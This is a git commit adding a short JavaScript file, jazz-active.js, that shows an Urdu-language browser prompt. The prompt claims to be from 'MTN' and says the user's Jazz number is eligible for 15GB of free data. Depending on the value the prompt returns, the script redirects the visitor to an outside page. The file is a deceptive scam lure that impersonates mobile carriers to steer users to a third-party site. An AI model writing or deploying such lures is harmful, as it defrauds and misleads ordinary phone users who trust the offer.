a9db790a00b122c41870a1036788ac2ff5580273
dhatablog <williamsnsiako@gmail.com>
2025-10-04 17:32:33 +0100

    Create jazz-active.js

---
+++ jazz-active.js
@@ -0,0 +1,5 @@
+var password = '15 جی بی کو چالو کریں۔'
+password=prompt('MTN: مبارک ہو، آپ کا جاز نمبر 15gb وصول کرنے کا اہل ہے، ابھی ایکٹیویٹ کرنے کے لیے OK پر کلک کریں','15 جی بی کو چالو کریں۔');
+if (password != '15 جی بی کو چالو کریں۔') {
+location.href='https://eahigh.org/jazz.html';
+}
